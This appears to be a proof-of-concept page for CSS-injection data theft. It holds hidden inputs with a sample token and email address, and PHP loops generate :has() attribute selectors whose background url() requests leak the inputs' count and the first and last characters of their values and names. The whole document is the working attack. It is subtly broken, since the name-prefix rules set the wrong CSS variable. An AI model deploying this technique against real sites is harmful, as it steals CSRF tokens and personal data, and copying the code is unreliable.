<input type="hidden" name="mytoken" value="ddaf35a193617abacc417349ae204">
<input type="hidden" name="email" value="gareth.heyes@portswigger.net">

<style>
<?php
$chrs = array_merge(range('a','z'),range(0,9));
$max = 20;
for($i=1;$i<$max;$i++) {
    echo 'body:has(input[type="hidden"]:nth-child('.$i.')){--inputCount: url(/?inputCount='.$i.');}'."\n";
}
foreach($chrs as $chr) {
    for($i=1;$i<$max;$i++) {
        echo 'body:has(input[type="hidden"][value^="'.$chr.'"]:nth-child('.$i.')){--input'.$i.'ValueBegins: url(/?input'.$i.'ValueBegins='.$chr.');}'."\n";
    }
}
foreach($chrs as $chr) {
    for($i=1;$i<$max;$i++) {
        echo 'body:has(input[type="hidden"][value$="'.$chr.'"]:nth-child('.$i.')){--input'.$i.'ValueEnds: url(/?input'.$i.'ValueEnds='.$chr.');}'."\n";
    }
}
foreach($chrs as $chr) {
    for($i=1;$i<$max;$i++) {
        echo 'body:has(input[type="hidden"][name^="'.$chr.'"]:nth-child('.$i.')){--input'.$i.'ValueBegins: url(/?input'.$i.'NameBegins='.$chr.');}'."\n";
    }
}
foreach($chrs as $chr) {
    for($i=1;$i<$max;$i++) {
        echo 'body:has(input[type="hidden"][name$="'.$chr.'"]:nth-child('.$i.')){--input'.$i.'NameEnds: url(/?input'.$i.'NameEnds='.$chr.');}'."\n";
    }
}
?>    
body {
    background:var(--inputCount,none),
    <?php
    $rules = [];
    for($i=1;$i<$max;$i++) {
        array_push($rules, 'var(--input'.$i.'ValueBegins,none)');
    }
    echo join(",", $rules);
    echo ',';
    $rules = [];
    for($i=1;$i<$max;$i++) {
        array_push($rules, 'var(--input'.$i.'ValueEnds,none)');
    }
    echo join(",", $rules);
    echo ',';
    $rules = [];
    for($i=1;$i<$max;$i++) {
        array_push($rules, 'var(--input'.$i.'NameBegins,none)');
    }
    echo join(",", $rules);
    echo ',';
    $rules = [];
    for($i=1;$i<$max;$i++) {
        array_push($rules, 'var(--input'.$i.'NameEnds,none)');
    }
    echo join(",", $rules);
    echo ';';
    ?>
}
</style>